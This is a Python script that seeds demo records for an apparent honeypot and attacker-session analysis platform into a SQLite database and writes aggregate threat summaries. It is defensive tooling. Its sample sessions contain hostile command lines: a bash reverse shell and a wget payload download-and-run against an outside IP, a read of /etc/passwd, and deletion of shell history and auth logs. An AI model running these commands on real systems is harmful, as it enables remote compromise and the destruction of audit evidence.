import json
import sqlite3
from collections import Counter
from datetime import datetime, timedelta, timezone
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
DB_PATH = ROOT / "data" / "telemetry.db"
DATA_DIR = ROOT / "data"


def dumps(value):
    return json.dumps(value, ensure_ascii=False)


def now_minus(minutes):
    return (datetime.now(timezone.utc) - timedelta(minutes=minutes)).isoformat()


def connect():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def tables(conn):
    rows = conn.execute(
        "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name"
    ).fetchall()
    return {row["name"] for row in rows}


def columns(conn, table):
    return {
        row["name"]
        for row in conn.execute(f"PRAGMA table_info({table})").fetchall()
    }


def insert_row(conn, table, data):
    available = columns(conn, table)
    filtered = {
        key: value
        for key, value in data.items()
        if key in available and key != "id"
    }

    if not filtered:
        return

    keys = list(filtered)
    placeholders = ", ".join(["?"] * len(keys))
    quoted = ", ".join(keys)

    cursor = conn.execute(
        f"INSERT INTO {table} ({quoted}) VALUES ({placeholders})",
        [filtered[key] for key in keys],
    )
    return cursor.lastrowid


def first_user_id(conn):
    if "users" not in tables(conn):
        return None

    row = conn.execute(
        """
        SELECT id
        FROM users
        ORDER BY
            CASE role WHEN 'admin' THEN 0 ELSE 1 END,
            id ASC
        LIMIT 1
        """
    ).fetchone()

    return row["id"] if row else None


def delete_demo_rows(conn):
    existing = tables(conn)

    delete_by_session = [
        "classified_sessions",
        "risk_decisions",
        "sandbox_runs",
        "telemetry_analysis",
        "adaptive_recommendations",
        "adaptive_actions_log",
    ]

    for table in delete_by_session:
        if table in existing and "session_id" in columns(conn, table):
            conn.execute(f"DELETE FROM {table} WHERE session_id LIKE 'demo-%'")

    if "honeypot_nodes" in existing:
        conn.execute("DELETE FROM honeypot_nodes WHERE node_id LIKE 'demo-%'")

    # Keep sqlite_sequence intact; duplicate demo rows are removed by natural keys above.


def seed_honeypots(conn, user_id):
    if "honeypot_nodes" not in tables(conn):
        return

    nodes = [
        {
            "node_id": "demo-ssh-edge-01",
            "name": "SSH Edge Trap",
            "status": "running",
            "honeypot_type": "ssh",
            "host": "10.20.0.11",
            "port": 2222,
            "version": "cowrie-profile-v2",
            "sessions_total": 7,
            "updated_at": now_minus(8),
            "user_id": user_id,
        },
        {
            "node_id": "demo-http-wp-02",
            "name": "WordPress Login Decoy",
            "status": "running",
            "honeypot_type": "http",
            "host": "10.20.0.21",
            "port": 8080,
            "version": "wp-admin-decoy-v3",
            "sessions_total": 5,
            "updated_at": now_minus(14),
            "user_id": user_id,
        },
        {
            "node_id": "demo-mysql-core-03",
            "name": "MySQL Credential Sink",
            "status": "stopped",
            "honeypot_type": "database",
            "host": "10.20.0.31",
            "port": 3306,
            "version": "mysql-banner-v1",
            "sessions_total": 2,
            "updated_at": now_minus(52),
            "user_id": user_id,
        },
    ]

    for node in nodes:
        insert_row(conn, "honeypot_nodes", node)


def demo_sessions():
    return [
        {
            "session_id": "demo-ssh-reverse-shell-001",
            "event_id": "evt-demo-001",
            "correlation_id": "corr-demo-001",
            "classification": "malicious",
            "confidence": 0.97,
            "tactics": ["Discovery", "Execution", "Command and Control"],
            "risk_score": 0.94,
            "sandbox_required": True,
            "reason": [
                "reverse_shell_pattern",
                "sensitive_file_access",
                "outbound_tcp_attempt",
            ],
            "observe_commands": ["whoami", "id", "uname -a", "cat /etc/passwd"],
            "commands_to_sandbox": [
                "bash -c 'bash -i >& /dev/tcp/185.199.108.22/4444 0>&1'",
                "cat /etc/passwd",
                "wget http://185.199.108.22/payload.sh -O /tmp/.x",
            ],
            "sandbox_level": "strict-network",
            "exit_code": 1,
            "commands_executed": [
                "whoami",
                "cat /etc/passwd",
                "wget http://185.199.108.22/payload.sh -O /tmp/.x",
                "bash /tmp/.x",
            ],
            "command_results": [
                {
                    "command": "whoami",
                    "exit_code": 0,
                    "stdout": "www-data\n",
                    "stderr": "",
                    "network_indicators": [],
                },
                {
                    "command": "cat /etc/passwd",
                    "exit_code": 0,
                    "stdout": "root:x:0:0:root:/root:/bin/bash\nmysql:x:112:118::/nonexistent:/usr/sbin/nologin\n",
                    "stderr": "",
                    "network_indicators": [],
                },
                {
                    "command": "wget http://185.199.108.22/payload.sh -O /tmp/.x",
                    "exit_code": 1,
                    "stdout": "",
                    "stderr": "sandbox: outbound network blocked\n",
                    "network_indicators": ["185.199.108.22", "payload.sh"],
                },
            ],
            "stdout": "www-data\nroot:x:0:0:root:/root:/bin/bash\n",
            "stderr": "sandbox: outbound network blocked\n",
            "files_created": ["/tmp/.x"],
            "files_modified": ["/tmp/.profile"],
            "files_deleted": [],
            "network_connections": ["185.199.108.22:4444", "185.199.108.22:80"],
            "syscalls": [
                "execve('/bin/sh', ['sh', '-c', 'whoami']) = 0",
                "openat(AT_FDCWD, '/etc/passwd', O_RDONLY) = 3",
                "connect(3, {sin_port=htons(4444), sin_addr=185.199.108.22}) = -1 ECONNREFUSED",
            ],
            "behaviors": [
                "reverse_shell_attempt",
                "sensitive_file_access",
                "payload_download_attempt",
                "network_blocked_by_sandbox",
            ],
            "indicators": ["185.199.108.22", "/tmp/.x", "/etc/passwd"],
            "severity_score": 0.96,
            "summary": "Attacker enumerated host identity, accessed sensitive account data, and attempted to fetch and execute an external payload.",
            "attack_chain": ["Discovery", "Execution", "Command and Control"],
            "recommendations": [
                (
                    "deploy_c2_decoy_listener",
                    "network_deception",
                    "Expose a controlled listener for the observed reverse-shell destination pattern.",
                    "critical",
                    "applied",
                ),
                (
                    "increase_network_telemetry_level",
                    "telemetry",
                    "Capture richer connection metadata for blocked outbound attempts.",
                    "high",
                    "applied",
                ),
            ],
            "minutes": 6,
        },
        {
            "session_id": "demo-http-wp-bruteforce-002",
            "event_id": "evt-demo-002",
            "correlation_id": "corr-demo-002",
            "classification": "mixed",
            "confidence": 0.82,
            "tactics": ["Credential Access", "Discovery"],
            "risk_score": 0.61,
            "sandbox_required": False,
            "reason": ["credential_spray_pattern", "repeated_login_failures"],
            "observe_commands": [],
            "commands_to_sandbox": [],
            "sandbox_level": "http-observe",
            "exit_code": 0,
            "commands_executed": ["POST /wp-login.php", "GET /wp-admin/"],
            "command_results": [
                {
                    "command": "POST /wp-login.php",
                    "exit_code": 0,
                    "stdout": "401 invalid credentials\n",
                    "stderr": "",
                    "network_indicators": ["203.0.113.44"],
                }
            ],
            "stdout": "401 invalid credentials\n",
            "stderr": "",
            "files_created": [],
            "files_modified": [],
            "files_deleted": [],
            "network_connections": ["203.0.113.44:51622"],
            "syscalls": ["accept4(3, {sin_addr=203.0.113.44}) = 5"],
            "behaviors": [
                "credential_spray",
                "admin_panel_probe",
                "repeated_authentication_failure",
            ],
            "indicators": ["203.0.113.44", "wp-login.php", "admin"],
            "severity_score": 0.58,
            "summary": "HTTP decoy observed repeated WordPress login attempts followed by admin panel probing.",
            "attack_chain": ["Discovery", "Credential Access"],
            "recommendations": [
                (
                    "deploy_fake_credentials",
                    "content_deception",
                    "Seed believable honey credentials into the login flow for higher-fidelity attacker tracking.",
                    "medium",
                    "queued",
                )
            ],
            "minutes": 19,
        },
        {
            "session_id": "demo-ssh-cleanup-003",
            "event_id": "evt-demo-003",
            "correlation_id": "corr-demo-003",
            "classification": "malicious",
            "confidence": 0.91,
            "tactics": ["Execution", "Defense Evasion / Cleanup"],
            "risk_score": 0.88,
            "sandbox_required": True,
            "reason": ["log_cleanup_attempt", "history_file_modification"],
            "observe_commands": ["history -c", "rm -f ~/.bash_history"],
            "commands_to_sandbox": ["rm -rf /var/log/auth.log", "history -c"],
            "sandbox_level": "filesystem-guard",
            "exit_code": 1,
            "commands_executed": ["history -c", "rm -f ~/.bash_history", "rm -rf /var/log/auth.log"],
            "command_results": [
                {
                    "command": "history -c",
                    "exit_code": 0,
                    "stdout": "",
                    "stderr": "",
                    "network_indicators": [],
                },
                {
                    "command": "rm -rf /var/log/auth.log",
                    "exit_code": 1,
                    "stdout": "",
                    "stderr": "sandbox: protected path write denied\n",
                    "network_indicators": [],
                },
            ],
            "stdout": "",
            "stderr": "sandbox: protected path write denied\n",
            "files_created": [],
            "files_modified": ["/home/demo/.bash_history"],
            "files_deleted": ["/var/log/auth.log"],
            "network_connections": [],
            "syscalls": [
                "unlinkat(AT_FDCWD, '/home/demo/.bash_history', 0) = 0",
                "unlinkat(AT_FDCWD, '/var/log/auth.log', 0) = -1 EACCES",
            ],
            "behaviors": [
                "execution_error_detected",
                "history_cleanup_attempt",
                "protected_log_delete_attempt",
            ],
            "indicators": ["/var/log/auth.log", ".bash_history"],
            "severity_score": 0.84,
            "summary": "Attacker attempted to clear shell history and remove authentication logs after command execution.",
            "attack_chain": ["Execution", "Defense Evasion / Cleanup"],
            "recommendations": [
                (
                    "enable_fake_sudo_responses",
                    "interaction_deception",
                    "Respond to privileged cleanup commands with believable denial and bait paths.",
                    "high",
                    "applied",
                )
            ],
            "minutes": 37,
        },
        {
            "session_id": "demo-benign-scanner-004",
            "event_id": "evt-demo-004",
            "correlation_id": "corr-demo-004",
            "classification": "benign",
            "confidence": 0.76,
            "tactics": ["Discovery"],
            "risk_score": 0.22,
            "sandbox_required": False,
            "reason": ["low_interaction_banner_probe"],
            "observe_commands": ["GET /", "HEAD /"],
            "commands_to_sandbox": [],
            "sandbox_level": None,
            "exit_code": 0,
            "commands_executed": [],
            "command_results": [],
            "stdout": "",
            "stderr": "",
            "files_created": [],
            "files_modified": [],
            "files_deleted": [],
            "network_connections": ["198.51.100.15:43120"],
            "syscalls": [],
            "behaviors": ["banner_grab", "low_interaction_probe"],
            "indicators": ["198.51.100.15"],
            "severity_score": 0.18,
            "summary": "Low-risk scanner performed a banner probe without follow-up exploitation behavior.",
            "attack_chain": ["Discovery"],
            "recommendations": [],
            "minutes": 64,
        },
    ]


def seed_sessions(conn, user_id):
    existing = tables(conn)

    for index, item in enumerate(demo_sessions(), start=1):
        classified_at = now_minus(item["minutes"])
        decided_at = now_minus(item["minutes"] - 1)
        executed_at = now_minus(item["minutes"] - 2)
        analyzed_at = now_minus(item["minutes"] - 3)
        sandbox_run_id = None
        telemetry_analysis_id = None

        if "classified_sessions" in existing:
            insert_row(conn, "classified_sessions", {
                "event_id": item["event_id"],
                "correlation_id": item["correlation_id"],
                "session_id": item["session_id"],
                "classification": item["classification"],
                "confidence": item["confidence"],
                "tactics": dumps(item["tactics"]),
                "model_name": "demo-session-classifier",
                "model_version": "v1.3-demo",
                "classified_at": classified_at,
                "user_id": user_id,
            })

        if "risk_decisions" in existing:
            insert_row(conn, "risk_decisions", {
                "event_id": item["event_id"],
                "correlation_id": item["correlation_id"],
                "session_id": item["session_id"],
                "risk_score": item["risk_score"],
                "sandbox_required": int(item["sandbox_required"]),
                "reason": dumps(item["reason"]),
                "observe_commands": dumps(item["observe_commands"]),
                "commands_to_sandbox": dumps(item["commands_to_sandbox"]),
                "decided_at": decided_at,
                "user_id": user_id,
            })

        if "sandbox_runs" in existing:
            sandbox_run_id = insert_row(conn, "sandbox_runs", {
                "event_id": item["event_id"],
                "correlation_id": item["correlation_id"],
                "session_id": item["session_id"],
                "exit_code": item["exit_code"],
                "sandbox_level": item["sandbox_level"] or "passive-observe",
                "commands_executed": dumps(item["commands_executed"]),
                "command_results": dumps(item["command_results"]),
                "stdout": item["stdout"],
                "stderr": item["stderr"],
                "files_created": dumps(item["files_created"]),
                "files_modified": dumps(item["files_modified"]),
                "files_deleted": dumps(item["files_deleted"]),
                "network_connections": dumps(item["network_connections"]),
                "syscalls": dumps(item["syscalls"]),
                "executed_at": executed_at,
                "user_id": user_id,
            })

        if "telemetry_analysis" in existing and sandbox_run_id is not None:
            telemetry_analysis_id = insert_row(conn, "telemetry_analysis", {
                "event_id": item["event_id"],
                "correlation_id": item["correlation_id"],
                "session_id": item["session_id"],
                "sandbox_run_id": sandbox_run_id,
                "behaviors": dumps(item["behaviors"]),
                "indicators": dumps(item["indicators"]),
                "severity_score": item["severity_score"],
                "summary": item["summary"],
                "syscall_summary": dumps({
                    "total": len(item["syscalls"]),
                    "network": len([s for s in item["syscalls"] if "connect" in s]),
                    "filesystem": len([s for s in item["syscalls"] if "open" in s or "unlink" in s]),
                }),
                "file_activity": dumps({
                    "created": item["files_created"],
                    "modified": item["files_modified"],
                    "deleted": item["files_deleted"],
                    "sensitive_access": [
                        value
                        for value in item["indicators"]
                        if value.startswith("/etc") or value.startswith("/var/log")
                    ],
                }),
                "process_activity": dumps({
                    "exec_paths": ["/bin/sh", "/usr/bin/wget"] if item["commands_executed"] else [],
                    "suspicious_processes": [
                        cmd.split()[0]
                        for cmd in item["commands_executed"]
                        if cmd
                    ],
                    "failed_commands": [
                        result["command"]
                        for result in item["command_results"]
                        if result.get("exit_code") not in (0, None)
                    ],
                }),
                "network_activity": dumps({
                    "connections": item["network_connections"],
                    "blocked": [
                        result["command"]
                        for result in item["command_results"]
                        if "network blocked" in result.get("stderr", "")
                    ],
                }),
                "attack_chain": dumps(item["attack_chain"]),
                "analyzed_at": analyzed_at,
                "user_id": user_id,
            })

        if "adaptive_recommendations" in existing and telemetry_analysis_id is not None:
            for rec_index, rec in enumerate(item["recommendations"], start=1):
                action_name, action_type, reason, priority, status = rec
                created_at = now_minus(item["minutes"] - 4 - rec_index)
                applied_at = created_at if status == "applied" else None

                recommendation_id = insert_row(conn, "adaptive_recommendations", {
                    "event_id": f"{item['event_id']}-rec-{rec_index}",
                    "correlation_id": item["correlation_id"],
                    "session_id": item["session_id"],
                    "telemetry_analysis_id": telemetry_analysis_id,
                    "action_type": action_type,
                    "action_name": action_name,
                    "reason": reason,
                    "evidence": dumps({
                        "session_id": item["session_id"],
                        "severity_score": item["severity_score"],
                        "behaviors": item["behaviors"][:3],
                    }),
                    "priority": priority,
                    "status": status,
                    "created_at": created_at,
                    "applied_at": applied_at,
                    "user_id": user_id,
                })

                if "adaptive_actions_log" in existing and status == "applied":
                    insert_row(conn, "adaptive_actions_log", {
                        "event_id": f"{item['event_id']}-act-{rec_index}",
                        "correlation_id": item["correlation_id"],
                        "session_id": item["session_id"],
                        "recommendation_id": recommendation_id,
                        "action_name": action_name,
                        "action_type": action_type,
                        "status": "applied",
                        "details": dumps({
                            "result": "demo action applied",
                            "node_id": "demo-ssh-edge-01",
                        }),
                        "created_at": now_minus(item["minutes"] - 3 - rec_index),
                        "user_id": user_id,
                    })


def write_aggregates():
    sessions = demo_sessions()
    behavior_counter = Counter()
    indicator_counter = Counter()
    chain_counter = Counter()
    action_counter = Counter()
    priority_counter = Counter()
    status_counter = Counter()

    severities = []

    for session in sessions:
        behavior_counter.update(session["behaviors"])
        indicator_counter.update(session["indicators"])
        chain_counter.update([" -> ".join(session["attack_chain"])])
        severities.append(session["severity_score"])

        for action_name, _action_type, _reason, priority, status in session["recommendations"]:
            action_counter.update([action_name])
            priority_counter.update([priority])
            status_counter.update([status])

    generated_at = datetime.now(timezone.utc).isoformat()

    node_summary = {
        "node_id": "demo-aggregate-local",
        "node_region": "local-lab",
        "generated_at": generated_at,
        "model_version": "v1.3-demo",
        "privacy_mode": "aggregated_only_no_raw_logs",
        "telemetry": {
            "sessions_analyzed": len(sessions),
            "avg_severity": round(sum(severities) / len(severities), 3),
            "max_severity": max(severities),
            "top_behaviors": behavior_counter.most_common(10),
            "top_indicators": indicator_counter.most_common(10),
            "top_attack_chains": chain_counter.most_common(10),
        },
        "adaptive": {
            "recommendations_total": sum(action_counter.values()),
            "by_status": dict(status_counter),
            "by_priority": dict(priority_counter),
            "top_actions": action_counter.most_common(10),
        },
    }

    global_view = {
        "generated_at": generated_at,
        "privacy_mode": "aggregated_only_no_raw_logs",
        "nodes": {
            "count": 3,
            "node_ids": ["demo-ssh-edge-01", "demo-http-wp-02", "demo-mysql-core-03"],
            "regions": {"local-lab": 2, "dmz-lab": 1},
        },
        "global_telemetry": node_summary["telemetry"],
        "global_adaptive": node_summary["adaptive"],
    }

    DATA_DIR.mkdir(parents=True, exist_ok=True)
    (DATA_DIR / "node_summary.json").write_text(
        dumps(node_summary), encoding="utf-8"
    )
    (DATA_DIR / "global_threat_view.json").write_text(
        dumps(global_view), encoding="utf-8"
    )


def main():
    if not DB_PATH.exists():
        raise SystemExit(f"Database not found: {DB_PATH}")

    with connect() as conn:
        user_id = first_user_id(conn)
        delete_demo_rows(conn)
        seed_honeypots(conn, user_id)
        seed_sessions(conn, user_id)
        conn.commit()

        counts = {
            table: conn.execute(f"SELECT COUNT(*) FROM {table}").fetchone()[0]
            for table in sorted(tables(conn))
        }

    write_aggregates()

    print("Demo data seeded into", DB_PATH)
    for table, count in counts.items():
        print(f"{table}: {count}")


if __name__ == "__main__":
    main()
